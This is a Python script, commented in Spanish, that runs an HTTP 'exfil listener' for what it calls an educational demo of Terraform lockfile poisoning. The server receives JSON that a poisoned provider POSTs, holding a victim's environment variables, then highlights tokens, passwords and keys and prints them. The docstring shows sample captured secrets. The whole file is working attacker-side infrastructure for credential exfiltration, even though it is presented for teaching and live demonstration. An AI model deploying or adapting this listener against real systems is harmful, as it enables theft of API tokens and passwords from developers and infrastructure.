#!/usr/bin/env python3
"""
=============================================================================
EXFIL LISTENER - Servidor HTTP de demostración (SOLO EDUCATIVO)
=============================================================================
Servidor HTTP simple que recibe el POST de exfiltración del provider
envenenado y lo muestra en consola con formato visual para la demo en vivo.

USO:
    python3 server.py                    # Escucha en 0.0.0.0:9090
    python3 server.py --port 8080        # Puerto personalizado
    python3 server.py --bind 127.0.0.1   # Solo localhost

EJEMPLO DE OUTPUT:
    ════════════════════════════════════════════════════════════
    🚨 EXFILTRACIÓN RECIBIDA desde 127.0.0.1 @ 2026-08-03 20:30:15
    ────────────────────────────────────────────────────────────
    Host: lcastle07  |  Usuario: admin  |  Provider: demo/poisoned v1.0.0
    ────────────────────────────────────────────────────────────
    Variables capturadas (3):
      PROXMOX_VE_API_TOKEN  = tf-user@pam!terraform=0be062ba-...
      TF_VAR_vm_password    = SuperSecretP@ss2024!
      GITHUB_TOKEN          = ghp_xxxxxxxxxxxx
    ════════════════════════════════════════════════════════════

⚠️  SOLO PARA USO EDUCATIVO en entornos aislados.
=============================================================================
"""

import argparse
import json
import sys
from datetime import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

# ── Colores ANSI para output en terminal ──────────────────────────────────────
class Colors:
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    YELLOW = "\033[1;33m"
    BLUE = "\033[0;34m"
    CYAN = "\033[0;36m"
    MAGENTA = "\033[0;35m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RESET = "\033[0m"


# Contador global de exfiltraciones recibidas
exfil_count = 0


class ExfilHandler(BaseHTTPRequestHandler):
    """Handler HTTP que recibe y muestra los datos exfiltrados."""

    def do_POST(self):
        """Procesa el POST con las variables de entorno capturadas."""
        global exfil_count

        # Leer el body del request
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        # Parsear JSON
        try:
            data = json.loads(body.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            self.send_response(400)
            self.end_headers()
            self.wfile.write(f"Error parseando JSON: {e}".encode())
            return

        # Incrementar contador
        exfil_count += 1
        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        # ── Mostrar datos en consola con formato visual ───────────────────
        env_vars = data.get("env_vars", {})
        hostname = data.get("hostname", "desconocido")
        username = data.get("username", "desconocido")
        provider = data.get("provider", "desconocido")
        timestamp = data.get("timestamp", now)

        c = Colors
        print(f"\n{c.RED}{c.BOLD}")
        print("═" * 62)
        print(f"  🚨 EXFILTRACIÓN #{exfil_count} RECIBIDA desde {client_ip}")
        print(f"  📅 {now}")
        print("═" * 62)
        print(f"{c.RESET}")

        print(f"{c.CYAN}  Host: {c.BOLD}{hostname}{c.RESET}"
              f"{c.CYAN}  |  Usuario: {c.BOLD}{username}{c.RESET}"
              f"{c.CYAN}  |  Provider: {c.BOLD}{provider}{c.RESET}")

        print(f"\n{c.DIM}{'─' * 62}{c.RESET}")
        print(f"{c.YELLOW}{c.BOLD}"
              f"  Variables capturadas ({len(env_vars)}):{c.RESET}")
        print(f"{c.DIM}{'─' * 62}{c.RESET}")

        if env_vars:
            # Alinear los valores para mejor legibilidad
            max_key_len = max(len(k) for k in env_vars.keys())
            for key, value in sorted(env_vars.items()):
                # Resaltar variables especialmente sensibles
                if any(s in key.upper() for s in ["TOKEN", "PASSWORD", "SECRET", "KEY"]):
                    color = c.RED
                    icon = "🔑"
                else:
                    color = c.GREEN
                    icon = "📋"

                # Truncar valores muy largos para la pantalla
                display_value = value
                if len(display_value) > 60:
                    display_value = display_value[:57] + "..."

                print(f"  {icon} {color}{key:<{max_key_len}}{c.RESET}"
                      f"  = {c.BOLD}{display_value}{c.RESET}")
        else:
            print(f"  {c.DIM}(ninguna variable sensible encontrada){c.RESET}")

        print(f"\n{c.RED}{'═' * 62}{c.RESET}")
        print(f"{c.DIM}  Raw timestamp del payload: {timestamp}{c.RESET}")
        print()

        # Responder 200 OK
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        response = json.dumps({
            "status": "received",
            "count": exfil_count
        })
        self.wfile.write(response.encode())

    def do_GET(self):
        """Health check endpoint."""
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        response = json.dumps({
            "status": "listening",
            "exfil_count": exfil_count,
            "message": "Exfil listener activo - esperando datos..."
        })
        self.wfile.write(response.encode())

    def log_message(self, format, *args):
        """Silenciar los logs default del servidor HTTP."""
        # Solo mostrar errores, no cada request
        pass


def main():
    parser = argparse.ArgumentParser(
        description="Exfil Listener - Servidor HTTP para demo de Lockfile Poisoning"
    )
    parser.add_argument(
        "--port", type=int, default=9090,
        help="Puerto donde escuchar (default: 9090)"
    )
    parser.add_argument(
        "--bind", type=str, default="0.0.0.0",
        help="Dirección IP donde escuchar (default: 0.0.0.0)"
    )
    args = parser.parse_args()

    server = HTTPServer((args.bind, args.port), ExfilHandler)

    c = Colors
    print(f"{c.CYAN}{c.BOLD}")
    print("╔══════════════════════════════════════════════════════════╗")
    print("║     📡 EXFIL LISTENER - Demo Lockfile Poisoning        ║")
    print("║     ⚠️  SOLO PARA USO EDUCATIVO                        ║")
    print("╠══════════════════════════════════════════════════════════╣")
    print(f"║  Escuchando en: http://{args.bind}:{args.port:<25}║")
    print(f"║  Endpoint:      POST /exfil{' ' * 25}║")
    print(f"║  Health check:  GET /{' ' * 31}║")
    print("╠══════════════════════════════════════════════════════════╣")
    print("║  Esperando exfiltración del provider envenenado...      ║")
    print("║  (Ctrl+C para detener)                                  ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"{c.RESET}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{c.YELLOW}Servidor detenido. "
              f"Total exfiltraciones recibidas: {exfil_count}{c.RESET}")
        server.server_close()
        sys.exit(0)


if __name__ == "__main__":
    main()
